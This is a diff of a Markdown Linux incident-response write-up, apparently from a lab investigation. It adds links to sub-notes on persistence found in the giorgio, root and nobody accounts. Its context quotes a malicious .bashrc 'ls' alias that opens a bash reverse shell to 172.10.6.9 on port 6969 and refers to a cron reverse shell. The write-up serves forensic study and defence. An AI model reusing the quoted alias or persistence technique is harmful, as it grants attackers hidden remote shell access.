@@ -20,7 +20,9 @@ Access was provided using privileged credentials:
 
 - **Operating System:** Ubuntu 20.04.6 LTS
 - **User Accounts Investigated:** giorgio, root, nobody
-
+- 📄 **Operating System Discovery**  
+  [Operating_System_Discovery.md](Linux-Incident-Response-Notes/Operating_System_Discovery.md)
+ 
 
   
 <p align="center">
@@ -49,6 +51,8 @@ Access was provided using privileged credentials:
 **File Identified**
 - **Filename:** `.bad_bash`  
 - **Location:** `/home/giorgio/`
+- 📄 **User Home Directory Enumeration**  
+  [User_Home_Directory_Enumeration.md](Linux-Incident-Response-Notes/User_Home_Directory_Enumeration.md)
 
 
 
@@ -61,7 +65,8 @@ The presence of a hidden file named `.bad_bash` in the user’s home directory i
 ---
 
 #### Malicious Bash Alias Persistence
-
+- 📄 **Shell Configuration Review (.bashrc Abuse)**  
+  [Shell_Configuration_Review.md](Linux-Incident-Response-Notes/Shell_Configuration_Review.md)
 
 
 **Modified `.bashrc` Entry**  
@@ -81,7 +86,8 @@ ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=
 
 
 ## 2. Scheduled Task Persistence (giorgio)
-
+- 📄 **Scheduled Task (Cron) Persistence Investigation**  
+  [Scheduled_Task_Investigation.md](Linux-Incident-Response-Notes/Scheduled_Task_Investigation.md)
 
 A malicious cron-executed reverse shell was identified:
 
@@ -101,6 +107,9 @@ Impact: Repeated outbound shell access
 
 
 ## 3. Root Account Investigation
+- 📄 **Root Account Persistence Analysis**  
+  [Root_Account_Investigation.md](Linux-Incident-Response-Notes/Root_Account_Investigation.md)
+
 Upon switching to the root account, an error message appeared automatically, indicating malicious execution without user interaction.
 
 Observed Error Output
@@ -131,6 +140,9 @@ Privilege Level: Root (critical severity)
 
 
 ## 4. System-Level Persistence
+- 📄 **System-Level Persistence via Default Accounts**  
+  [System_Level_Persistence.md](Linux-Incident-Response-Notes/System_Level_Persistence.md)
+
 A final persistence mechanism was identified tied to a default Linux account.
 
 Account Name: nobody
